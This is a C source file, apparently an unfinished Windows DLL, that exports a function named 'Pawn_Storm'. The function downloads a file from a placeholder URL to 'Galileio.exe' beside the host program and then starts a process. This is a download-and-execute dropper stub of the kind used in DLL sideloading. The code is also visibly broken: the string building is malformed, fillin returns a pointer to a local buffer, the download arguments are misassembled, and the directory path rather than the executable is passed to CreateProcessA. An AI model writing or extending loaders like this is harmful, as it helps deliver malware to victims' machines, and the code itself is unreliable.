#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <locale.h>
#include <winhttp.h>
#include <windows.h>



__declspec(dllexport) void Pawn_Storm(){

    
    setlocale(LC_ALL, ""); // Ensure proper wide-char handling

    char* str1 = "url when i get it"; //===============================================================================================================================
    char * str3 = fillin();
    char* str2 = "%s\\Galileio.exe", str3;

    // Step 1: Compute length for wide strings
    size_t len1 = mbstowcs(NULL, str1, 0); // Convert to wide char length
    size_t len2 = mbstowcs(NULL, str2, 0);

    // Step 2: Allocate memory for concatenated wide string
    wchar_t* wstr = malloc((len1 + len2 + 1) * sizeof(wchar_t));
    if (!wstr) return 1;

    // Step 3: Convert first string
    mbstowcs(wstr, str1, len1 + 1);

    // Step 4: Convert second string and concatenate
    mbstowcs(wstr + len1, str2, len2 + 1);


    varda(3, wstr);

    free(wstr);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Path to your executable
    const char* exePath = str3;

    // Start the process
    CreateProcessA(
        exePath,   // Application name
        NULL,      // Command line arguments
        NULL,      // Process handle not inheritable
        NULL,      // Thread handle not inheritable
        FALSE,     // Set handle inheritance to FALSE
        0,         // No creation flags
        NULL,      // Use parent's environment block
        NULL,      // Use parent's starting directory 
        &si,       // Pointer to STARTUPINFO structure
        &pi
    );       // Pointer to PROCESS_INFORMATION structure
    

    // Wait until the process exits
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

}


char *fillin(){

    char path[MAX_PATH];
    
    // Get the full path of the executable
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) {
    }

    // Remove the executable name to get the directory
    char* lastSlash = strrchr(path, '\\');
    if (lastSlash) {
        *lastSlash = '\0'; // terminate the string at the last backslash
    }
    return path;
}



int varda(int argc, wchar_t *argv[]){

    if (argc != 3)
    {
        wprintf(L"Usage: %s <URL> <output file>\n", argv[0]);
        return 1;
    }

    wchar_t *url = argv[1];       // Full URL e.g., https://example.com/file.zip
    wchar_t *output_file = argv[2];

    // Parse URL into components
    URL_COMPONENTS urlComp;
    memset(&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    wchar_t host[256];
    wchar_t path[1024];
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = _countof(host);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = _countof(path);

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp))
    {
        wprintf(L"Invalid URL.\n");
        return 1;
    }

    // Open session
    HINTERNET hSession = WinHttpOpen(L"WinHTTP Downloader/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return 1;

    // Connect
    INTERNET_PORT port = urlComp.nPort ? urlComp.nPort : INTERNET_DEFAULT_HTTPS_PORT;
    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, port, 0);
    if (!hConnect) return 1;

    // Open request
    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            flags);
    if (!hRequest) return 1;

    // Send request
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL))
    {
        FILE *fp = _wfopen(output_file, L"wb");
        if (!fp) return 1;

        DWORD bytesAvailable = 0;
        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0)
        {
            char *buffer = (char*)malloc(bytesAvailable);
            DWORD bytesRead = 0;
            if (WinHttpReadData(hRequest, buffer, bytesAvailable, &bytesRead) && bytesRead > 0)
            {
                fwrite(buffer, 1, bytesRead, fp);
            }
            free(buffer);
        }

        fclose(fp);
    
    }
    else
    {
        
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}